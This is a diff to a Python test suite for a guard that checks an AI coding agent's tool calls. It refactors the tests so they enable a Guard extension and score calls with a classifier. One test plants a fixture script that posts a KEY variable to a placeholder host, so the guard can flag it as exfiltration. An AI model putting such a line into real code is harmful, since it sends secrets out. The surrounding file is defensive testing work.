@@ -13,7 +13,16 @@ from intern import hooks as h
 from intern.decisions import Answer, Answers, ChoiceAnswer, NoulAnswer, Question
 from intern.events import Decision, ToolGuard
 from intern.executor import ExecResult
-from intern.guard import RISK, Scope, judgement_state, needs_judgement, rule_hits, scripts_run, verdict
+from intern.extensions.guard import (
+    RISK,
+    Guard,
+    Scope,
+    judgement_state,
+    needs_judgement,
+    rule_hits,
+    scripts_run,
+    verdict,
+)
 from intern.journal import MessageEntry
 from intern.messages import JsonObject, ToolCall, ToolResult, ToolResultMessage
 from intern.providers.fake import Turn
@@ -351,8 +360,16 @@ class ScriptedBackend:
         )
 
 
-def guarded(make_harness, script: list[Turn], *, status: str = "", system1: ScriptedBackend | None = None, **kw):
-    harness = make_harness(script, system1=system1, **kw)
+def guarded(
+    make_harness,
+    script: list[Turn],
+    *,
+    status: str = "",
+    system1: ScriptedBackend | None = None,
+    extensions: list[h.Extension] | None = None,
+):
+    """A harness with the guard on, after `extensions`, and an executor that runs nothing."""
+    harness = make_harness(script, system1=system1, extensions=[*(extensions or []), Guard()])
     executor = RecordingExecutor(status)
     harness.deps.executor = executor
     return harness, executor
@@ -437,7 +454,7 @@ async def test_system1_judges_a_call_with_the_users_system1_md_after_the_session
 
 async def test_system1_sees_what_a_script_the_call_runs_holds_wherever_it_lives(make_harness):
     system1 = ScriptedBackend({"exfiltrates": 0.95, "routine": 0.05}, asked=0.02)
-    harness = make_harness([bash("python sync.py"), Turn(text="Done.")], system1=system1)
+    harness = make_harness([bash("python sync.py"), Turn(text="Done.")], system1=system1, extensions=[Guard()])
     (harness.cwd / "sync.py").write_text("import urllib.request\nurllib.request.urlopen('https://x.io', data=KEY)\n")
     await harness.run("fix the failing test")
     (state,) = system1.guard_states
